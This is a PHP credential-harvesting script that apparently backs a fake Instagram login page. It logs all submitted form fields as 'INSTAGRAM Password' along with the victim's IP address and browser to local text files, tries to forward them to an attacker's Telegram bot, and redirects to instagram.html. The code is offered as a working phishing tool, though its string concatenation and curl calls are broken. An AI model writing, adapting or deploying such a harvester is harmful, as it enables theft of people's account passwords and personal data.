<?php
$date = new DateTime("now", new DateTimeZone('Asia/Kolkata'));
$date = $date->format("y:m:d h:i:s");
$raw = fopen('raw.txt', 'a+');
$template=fopen('instagram.txt','a+');
$message="INSTAGRAM Password at " + $date +"%0A";
fwrite($raw, $date);
fwrite($raw, "\n ");
fwrite($template, $date);
fwrite($template, "\n ");

foreach($_POST as $variable => $value) {
   fwrite($raw, $variable);
   fwrite($raw, "=");
   fwrite($raw, $value);
   fwrite($raw, "\r\n");

   fwrite($template, $variable);
   fwrite($template, "=");
   fwrite($template, $value);
   fwrite($template, "\r\n");

   $message += $variable + "=" + $value +"%0A" ;
}


if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT']."\r\n";
$victim = "IP: ";


$message += $victim +"%0A" + $browser +"%0A" +$useragent +"%0A" +"%0A";
$tgbot = getenv('TGBOT', true) ?: getenv('TGBOT');
$tgchat = getenv('TGCHAT', true) ?: getenv('TGCHAT');
$url = 'http://api.telegram.org/bot'+$tgbot+'/sendMessage';
$ch = curl_init($url);
curl_setopt($ch, chat_id, $tgchat);
curl_setopt($ch, text, $message);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);



fwrite($raw, $victim);
fwrite($raw, $ipaddress);
fwrite($raw, $useragent);
fwrite($raw, $browser);

fwrite($raw, "\r\n");
fwrite($raw, "\r\n");

fwrite($raw, $tgbot);
fwrite($raw, "\r\n");
fwrite($raw, $tgchat);
fwrite($raw, "\r\n");
fwrite($raw, "tg message \r\n");
fwrite($raw, $message);
fwrite($raw, "\r\n");
fwrite($raw, "\r\n");
fwrite($raw, $response);

fwrite($template, $victim);
fwrite($template, $ipaddress);
fwrite($template, $useragent);
fwrite($template, $browser);


fwrite($raw, "\r\n\n");
fwrite($template, "\r\n\n");
fclose($raw);
fclose($template);
header ("Location: instagram.html");
exit();
